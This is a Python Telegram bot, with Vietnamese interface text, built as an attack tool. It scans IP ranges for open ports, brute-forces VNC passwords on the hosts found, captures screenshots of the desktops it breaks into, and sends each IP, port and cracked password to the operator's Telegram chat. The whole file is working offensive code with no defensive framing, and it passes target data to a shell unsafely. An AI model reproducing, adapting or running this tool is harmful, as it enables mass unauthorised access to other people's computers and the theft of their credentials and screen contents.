import subprocess
import os
from datetime import datetime
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
import ipaddress
import socket
from tqdm import tqdm

# Thay thế token bằng token bot telegram của bạn
bot = telebot.TeleBot('YOUR_BOT_TOKEN_HERE')

stop_flag = False
user_state = {}

def check_vnc_connection(ip, port, passwd):
    try:
        command = f"vncdo -s {ip}::{port} {'-p ' + passwd if passwd else ''} key a"
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
        stderr_output = result.stderr.decode().strip()
        return not ("Authentication failure" in stderr_output or "unable to open display" in stderr_output or result.returncode != 0)
    except Exception:
        return False

def capture_screenshot(ip, port, passwd, filename):
    try:
        command = f"vncdo -s {ip}::{port} {'-p ' + passwd if passwd else ''} capture {filename}"
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
        stderr_output = result.stderr.decode().strip()
        return not ("Authentication failure" in stderr_output or "unable to open display" in stderr_output or result.returncode != 0)
    except Exception:
        return False

def cidr_to_ip(cidr):
    try:
        return [str(ip) for ip in ipaddress.IPv4Network(cidr)]
    except ValueError:
        return []

def scan_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, int(port)))
        sock.close()
        return result == 0
    except:
        return False

@bot.message_handler(commands=['start'])
def handle_start(message):
    bot.reply_to(message, "Chào mừng! Sử dụng /scan để quét IP, /brute để brute force, /stop để dừng quá trình, và /exit để thoát.")

@bot.message_handler(commands=['scan'])
def handle_scan(message):
    user_state[message.chat.id] = 'waiting_for_cidr'
    bot.reply_to(message, "Vui lòng gửi file CIDR (.txt)")

@bot.message_handler(commands=['brute'])
def handle_brute(message):
    user_state[message.chat.id] = 'waiting_for_ip_file'
    bot.reply_to(message, "Vui lòng gửi file IP (.txt) chứa các IP dạng ip:port")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    global stop_flag
    stop_flag = True
    bot.reply_to(message, "Đã gửi lệnh dừng. Quá trình sẽ dừng sau khi hoàn thành công việc hiện tại.")

@bot.message_handler(commands=['exit'])
def handle_exit(message):
    bot.reply_to(message, "Tạm biệt!")
    bot.stop_polling()

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    if chat_id not in user_state:
        bot.reply_to(message, "Vui lòng sử dụng /scan hoặc /brute trước khi gửi file.")
        return

    if message.document.file_name.endswith('.txt'):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open(message.document.file_name, 'wb') as new_file:
            new_file.write(downloaded_file)

        if user_state[chat_id] == 'waiting_for_cidr':
            user_state[chat_id] = 'waiting_for_ports'
            bot.reply_to(message, "Đã nhận file CIDR. Vui lòng nhập các port cần quét (ngăn cách bằng dấu phẩy)")
        elif user_state[chat_id] == 'waiting_for_ip_file':
            user_state[chat_id] = 'waiting_for_password_file'
            bot.reply_to(message, "Đã nhận file IP. Vui lòng gửi file password (.txt)")
        elif user_state[chat_id] == 'waiting_for_password_file':
            start_brute_force(chat_id, message.document.file_name)
    else:
        bot.reply_to(message, "Vui lòng gửi file .txt")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    chat_id = message.chat.id
    if chat_id in user_state and user_state[chat_id] == 'waiting_for_ports':
        ports = message.text.split(',')
        start_scan(chat_id, ports)

def start_scan(chat_id, ports):
    global stop_flag
    stop_flag = False
    bot.send_message(chat_id, "Bắt đầu quét...")
    
    with open('cidr.txt', 'r') as f:
        cidr_list = f.read().splitlines()

    all_ips = []
    for cidr in cidr_list:
        all_ips.extend(cidr_to_ip(cidr))

    open_ips = []
    total_ips = len(all_ips) * len(ports)
    scanned_ips = 0

    for ip in all_ips:
        for port in ports:
            if stop_flag:
                bot.send_message(chat_id, "Đã dừng quét.")
                return
            if scan_port(ip, port):
                open_ips.append(f"{ip}:{port}")
            scanned_ips += 1
            if scanned_ips % 100 == 0:
                bot.send_message(chat_id, f"Đã quét {scanned_ips}/{total_ips} IP")

    with open('ips.txt', 'w') as f:
        for ip in open_ips:
            f.write(f"{ip}\n")

    bot.send_document(chat_id, open('ips.txt', 'rb'), caption=f"Đã quét xong. Tìm thấy {len(open_ips)} IP mở cổng.")
    os.remove('ips.txt')
    os.remove('cidr.txt')

def start_brute_force(chat_id, password_file):
    global stop_flag
    stop_flag = False
    bot.send_message(chat_id, "Bắt đầu brute force...")

    with open('ips.txt', 'r') as f:
        ips = f.read().splitlines()

    with open(password_file, 'r') as f:
        passwords = f.read().splitlines()

    for ip_port in ips:
        if stop_flag:
            bot.send_message(chat_id, "Đã dừng brute force.")
            break
        ip, port = ip_port.split(':')
        for password in passwords:
            if check_vnc_connection(ip, port, password):
                timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
                filename = f"{ip.replace('.', '-')}_{port}_{password}_{timestamp}.png"
                if capture_screenshot(ip, port, password, filename):
                    message = f"✳ IP: {ip}\n🔒 Cổng: {port}\n🔑 Mật khẩu: {password}\n⚡ Trạng thái: Trực tuyến"
                    with open(filename, 'rb') as photo:
                        bot.send_photo(chat_id, photo, caption=message)
                    os.remove(filename)
                break

    bot.send_message(chat_id, "Brute force hoàn tất.")
    os.remove('ips.txt')
    os.remove(password_file)

bot.polling()